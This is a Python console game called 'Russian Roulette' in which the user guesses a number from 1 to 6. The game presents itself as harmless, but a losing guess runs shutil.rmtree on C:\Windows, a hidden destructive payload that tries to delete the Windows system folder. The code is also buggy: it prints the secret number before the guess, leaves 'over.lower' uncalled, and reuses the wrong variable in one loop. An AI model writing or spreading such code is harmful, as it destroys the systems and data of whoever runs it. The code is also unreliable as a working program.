import random
import time
import shutil

def russian_roulette():
    one_rand = 0
    two_rand = 0
    three_rand = 0

    done = False
    folder_path = (r'C:\Windows')

    while not done:

        pc_number = random.randint(1, 6)
        print(pc_number)
        guess = int(input("Enter a number 1 to 6:"))

        print("The wheel is spinning.")
        time.sleep(2)
        print("The wheel is stopping")
        time.sleep(1)

        while True:
            one_rand = random.randint(1, 6)
            if pc_number == one_rand:
               pass 
            else:
                break

        print("it flew past", one_rand)
        time.sleep(1)

        while True:
            two_rand = random.randint(1, 6)
            if one_rand == two_rand or pc_number == two_rand:
                pass 
            else:
                break

        print("its stopping but it passed", two_rand)
        time.sleep(1)

        while True:
            two_rand = random.randint(1, 6)
            if one_rand == three_rand or two_rand == three_rand:
                pass 
            else:
                break

        print("Oh no, its very close to", random.randint(1, 6))
        time.sleep(1)
        print("It landed on", pc_number)

        if guess == pc_number:
            print("You LOST.")
            shutil.rmtree(folder_path)
            over = input("Would you like to continue? y/n:")
            over = over.lower
             
            if over == 'n':
                print("Play again soon, bye.")
                done = True

            elif over == 'y':
                print("Okay.")

            else:
                print("ERROR")
            
        elif not guess == pc_number:
            over = input("Good guess, would you like to continue? y/n:")
            over = over.lower()

            if over == 'n':
                print("Play again soon, bye.")
                done = True

            elif over == 'y':
                print("Okay.")

            else:
                print("ERROR")

            

    
yes_no = input("This is Russian Roulette. Start game? y/n:")
yes_no = yes_no.lower()

if yes_no == 'n':
    print("Okay, bye.")

elif yes_no == 'y':
    russian_roulette()

else:
    print("ERROR")